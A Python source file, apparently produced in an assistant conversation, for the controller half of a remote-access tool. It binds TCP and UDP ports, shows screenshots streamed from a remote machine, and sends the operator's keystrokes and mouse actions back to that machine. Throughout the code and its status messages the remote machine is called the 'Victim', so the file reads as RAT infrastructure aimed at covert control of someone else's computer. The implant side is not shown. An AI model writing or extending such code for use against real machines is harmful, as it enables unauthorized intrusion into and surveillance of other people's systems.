import socket
import tkinter
import threading
from PIL import Image, ImageTk
from io import BytesIO
import mouse as mouse_lib
import keyboard

class MainController:
    def __init__(self):
        # 1. Setup GUI
        self.root = tkinter.Tk()
        self.root.title("Controller Server - Waiting for Victim...")
        self.label = tkinter.Label(self.root)
        self.label.pack()

        # State variables
        self.kb_conn = None        # Will hold the TCP connection object
        self.mouse_addr = None     # Will hold the Victim's (IP, Port) for UDP

        # 2. Setup Sockets (WE ARE NOW THE SERVER FOR EVERYTHING)
        
        # Keyboard (TCP Server)
        self.kb_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.kb_sock.bind(('0.0.0.0', 12345))
        self.kb_sock.listen(1)

        # Mouse (UDP Server)
        self.mouse_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.mouse_sock.bind(('0.0.0.0', 12346))

        # Screen (UDP Receiver) - Updated to UDP as you requested earlier
        self.screen_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.screen_sock.bind(('0.0.0.0', 10000))
        self.screen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1000000)

        # 3. Start Background Threads
        threading.Thread(target=self.wait_for_keyboard, daemon=True).start()
        threading.Thread(target=self.wait_for_mouse_ping, daemon=True).start()
        threading.Thread(target=self.receive_screen, daemon=True).start()
        
        # 4. Start Inputs
        self.setup_hooks()
        
        print(f"--- CONTROLLER STARTED ---")
        print(f"1. Port Forward TCP 12345 (Keyboard)")
        print(f"2. Port Forward UDP 12346 (Mouse)")
        print(f"3. Port Forward UDP 10000 (Screen)")
        
        self.root.mainloop()

    def wait_for_keyboard(self):
        print("KEYBOARD: Listening on port 12345...")
        while True:
            conn, addr = self.kb_sock.accept()
            print(f"KEYBOARD: Connected by {addr}")
            self.kb_conn = conn
            # Keep the connection alive until it breaks
            try:
                while True:
                    if conn.recv(1024) == b'': break
            except:
                pass
            print("KEYBOARD: Disconnected. Listening again...")
            self.kb_conn = None

    def wait_for_mouse_ping(self):
        print("MOUSE: Listening for 'Ping' on port 12346...")
        while True:
            # We wait for the victim to send ANY data to us first
            data, addr = self.mouse_sock.recvfrom(1024)
            
            if data == b'ping':
                # SAVE THE ADDRESS! We need this to send commands back.
                self.mouse_addr = addr
                print(f"MOUSE: Target identified at {addr}")

    def setup_hooks(self):
        # Keyboard Hook
        def on_key(event):
            if self.kb_conn and event.event_type == keyboard.KEY_DOWN:
                try:
                    self.kb_conn.sendall(f"k:{event.name}\n".encode())
                except: pass
        keyboard.hook(on_key)

        # Mouse Click Hooks
        mouse_lib.on_click(lambda: self.send_mouse("c:left"))
        mouse_lib.on_right_click(lambda: self.send_mouse("c:right"))

        # Mouse Movement
        threading.Thread(target=self.track_mouse, daemon=True).start()

    def send_mouse(self, msg):
        # Only send if we know where the victim is (Ping received)
        if self.mouse_addr:
            self.mouse_sock.sendto(msg.encode(), self.mouse_addr)

    def track_mouse(self):
        last_pos = (0, 0)
        while True:
            curr_pos = mouse_lib.get_position()
            if curr_pos != last_pos:
                self.send_mouse(f"m:{curr_pos[0]},{curr_pos[1]}")
                last_pos = curr_pos
            threading.Event().wait(0.01)

    def receive_screen(self):
        while True:
            try:
                data, _ = self.screen_sock.recvfrom(65507)
                img = Image.open(BytesIO(data))
                photo = ImageTk.PhotoImage(img)
                self.label.config(image=photo)
                self.label.image = photo
            except:
                continue

if __name__ == "__main__":
    MainController()